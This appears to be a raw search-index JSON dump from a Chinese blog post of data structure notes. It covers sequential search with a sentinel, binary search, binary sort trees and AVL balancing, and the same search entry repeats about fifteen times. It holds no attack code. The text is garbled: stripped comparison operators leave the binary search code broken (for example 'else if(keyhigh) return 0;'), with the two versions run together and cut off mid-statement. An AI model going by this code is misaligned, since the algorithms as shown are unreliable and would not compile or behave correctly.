}ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-1"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#提高查找效率"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#特点"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#折半查找"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-2"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-1"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#特点-1"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#分块查找"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#条件"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#查找过程"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-2"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#特点-2"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#查找方法比较"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(key\u003cT-\u003edata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树表的查找"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： (1)若其左子树非空，则左子树上所有结点的值均小于根结点的值 (2)若其右子树非空，则右子树上所有结点的值均大于等于根结点的值 (3)其左右子树本身又各是一棵二叉排序树 性质中序遍历非空的二叉排序树所得到的数据元素序列是一个按关键字排列的递增有序序列。 存储结构 typedef struct{ KeyType key; //关键字项 InfoType otherinfo; //其他数据域 }ElemType; typedef struct BSTNode{ ElemType data; //数据域 struct BSTNode *Lchild,*rchild; //左右孩子指针 }BSTNode,*BSTree 算法实现（递归） BSTree SearchBST(BSTree T,KeyType key){ if((!T)||key==T-\u003edata.key) return T; else if(keydata.key) return SearchBST(T-\u003eLchild,key); else return SearchBST(T-\u003erchild,key); }//SearchBST 性能分析二又排序树上查找某关键字等于给定值的结点过程，其实就是走了一条从根到该结点的路径。 比较的关键字次数=此节点所在层数 最多的比较次数=树的深度 平均查找长度 含有n个结点的二叉排序树的平均查找长度和树的形态有关 最好情况： 初始序列{45,24,53,12,37,93)，ASL=log2 (n + 1) - 1；树的深度为:⌊log2 n⌋+ 1；与折半查找中的判定树相同。(形态比较均): O (log2 n)1 最坏情况： 初始序列{12,24,37,45,53,93}插入的n个元素从一开始就有序，——变成单支树的形态！此时树的深度为n，ASL=(n+ 1)/2查找效率与顺序查找情况相同：O(n) 操作\r插入插入的元素一定在叶节点上 生成一个无序序列可通过构造二叉排序树而变成一个有序序列。构造树的过程就是对无序序列进行排序的过程。 插入的结点均为叶子结点，故无需移动其他节点。相当于在有序序列插入记录而无需移动其他记录。 关键字输入顺序不同，建立的不同二叉排序树。 删除要保证删除后所得的二叉树仍满足二叉排序树的性质不变。 将因删除结点而断开的二叉链表重新连接起来 防止重新链接后树的高度增加 （1）被删除的结点是叶子结点：直接删去该结点。 （2）被删除的结点只有左子树或者只有右子树，用其左子树或者右子树替换它 (结点替换)。 其双亲结点的相应指针域的值改为“指向被删除结点的左子树或右子树”。 （3）被删除的结点既有左子树，也有右子树。 以其中序前趋值替换之（值替换），然后再删除该前趋结点。前趋时左子树中最大的结点。 也可以用其后继替换之，然后再删除该后继节点。后继是右子树中最小的结点。 平衡二叉树Balanced Binary Tree，又称AVL树 一棵平衡二叉树或者是空树，或者是具有下列性质的二叉排序树： 左子树与右子树的高度之差的绝对值小于等于1； 左子树和右子树也是平衡二叉树。 为计算方便，给每个结点附加一个数字，给出该结点左子树与右子树的高度差。这个数字称为结点的平衡因子（BF）。 平衡因子=结点左子树的高度-结点右子树的高度 对于一棵有n个结点的AVL树，其高度保持在O(log2 n)数量级，ASL保持在O(log2 n)量级 分析与调整如果在一棵AVL树中插入一个新结点后造成失衡，则必须重新调整树的结构，使之恢复平衡。 平衡调整的四种类型： A：失衡结点 不止一个失衡结点时，为最小失衡子树的根结点 B：A结点的孩子，C结点的双亲 C：插入新结点的子树 调整原则： ①降低高度 ②保持二叉排序树性质 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉排序树"},{"categories":["notice"],"content":"\r树表的查找\r二叉排序树Binary Sort Tree，又称为二叉搜索树、二叉查找树 定义二叉排序树或是空树，或是满足如下性质的二叉树： 